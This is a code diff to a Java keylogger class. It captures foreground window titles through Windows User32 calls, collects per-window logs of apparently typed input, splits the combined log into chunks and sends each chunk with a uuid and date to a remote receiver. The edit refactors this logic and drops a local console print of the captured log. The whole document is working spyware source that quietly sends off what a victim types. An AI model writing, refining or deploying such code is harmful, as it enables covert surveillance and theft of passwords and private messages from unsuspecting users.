@@ -48,10 +48,11 @@ public class KeyLogger {
                 var user32 = User32.INSTANCE;
                 var foregroundWindow = user32.GetForegroundWindow();
 
-                user32.GetWindowText(foregroundWindow, buffer, buffer.length);
 
                 var pointer = foregroundWindow.getPointer();
                 if (!log.containsKey(pointer)) {
+                    user32.GetWindowText(foregroundWindow, buffer, buffer.length);
+
                     log.put(pointer, new StringBuilder());
                     log.get(pointer).append("Window: ").append(String.valueOf(buffer).trim()).append("\n");
                 }
@@ -81,13 +82,13 @@ public class KeyLogger {
     }
 
     private void Log() {
-        var bigLog = new StringBuilder();
+        var log = new StringBuilder();
 
-        for (var entry : log.entrySet()) {
-            bigLog.append(entry.getValue()).append("\n").append("==================================================").append("\n");
+        for (var entry : this.log.entrySet()) {
+            log.append(entry.getValue()).append("\n").append("==================================================").append("\n");
         }
 
-        var logSize = bigLog.length();
+        var logSize = log.length();
         var splitSize = Math.round((logSize * 1.0f / LIMIT_LOG_SIZE) + .5f);
 
 
@@ -102,12 +103,10 @@ public class KeyLogger {
             var start = i * LIMIT_LOG_SIZE;
             var end = Math.min(start + LIMIT_LOG_SIZE, logSize);
 
-            var log = bigLog.substring(start, end);
-
-            System.out.println(log);
-            sender.send(null, new KeyLogRequest(uuid, log, dateStr));
+            var chunk = log.substring(start, end);
+            sender.send(null, new KeyLogRequest(uuid, chunk, dateStr));
         }
 
-        log.clear();
+        this.log.clear();
     }
 }
